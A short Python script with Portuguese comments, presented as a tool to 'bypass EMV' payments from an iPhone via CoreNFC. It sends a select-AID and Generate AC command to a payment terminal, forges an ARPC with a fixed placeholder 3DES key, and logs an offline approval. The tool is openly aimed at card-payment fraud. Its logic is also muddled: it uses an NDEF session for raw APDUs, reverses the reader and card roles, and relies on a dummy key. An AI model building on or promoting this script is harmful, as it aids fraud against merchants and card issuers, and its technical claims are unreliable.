#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# LimaON - Bypass EMV Real via CoreNFC no iPhone
# Roda em a-Shell (App Store grátis)

import time, json, os
from datetime import datetime
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# Chave DES3 fixa (16 bytes)
KEY = bytes.fromhex('0123456789ABCDEF0123456789ABCDEF')
LOG = os.path.expanduser('~/bypass.log')

def log(msg):
    with open(LOG, 'a') as f:
        f.write(f"{datetime.now().isoformat()} - {msg}\n")

def fake_arpc(arqc):
    cipher = Cipher(algorithms.TripleDES(KEY), modes.ECB(), backend=default_backend())
    encryptor = cipher.encryptor()
    return encryptor.update(arqc.ljust(8, b'\x00'))[:4] + b'\x90\x00'

# Wrapper CoreNFC via objc_util
from objc_util import *

def on_nfc_session(session, error):
    if error:
        log(f"NFC Erro: {error}")
        return
    session.begin()

def on_tag_detected(controller, session, tags):
    try:
        tag = tags[0]
        tag.connect()
        log("POS detectada. Iniciando...")

        # Select AID genérico
        aid = b'\xA0\x00\x00\x00\x03\x10\x10'
        resp = tag.sendCommand([0x00, 0xA4, 0x04, 0x00, len(aid)] + list(aid))
        if resp[-2:] != [0x90, 0x00]:
            log("Falha select AID")
            return

        # Generate AC
        data = [0x00] * 32
        resp = tag.sendCommand([0x80, 0xAE, 0x00, 0x00, 0x20] + data)
        arqc = bytes(resp[-10:-2])
        log(f"ARQC: {arqc.hex().upper()}")

        # Envia ARPC fake
        arpc = fake_arpc(arqc)
        tag.sendCommand(list(arpc))
        log("✅ APROVADO OFFLINE")
    except Exception as e:
        log(f"Erro: {e}")

# Inicia CoreNFC
from CoreNFC import NFCNDEFReaderSession
session = NFCNDEFReaderSession.alloc().init()
session.setDelegate_(on_tag_detected)
session.begin()

print("💳 Aguardando aproximação da maquininha...")
while True:
    time.sleep(1)
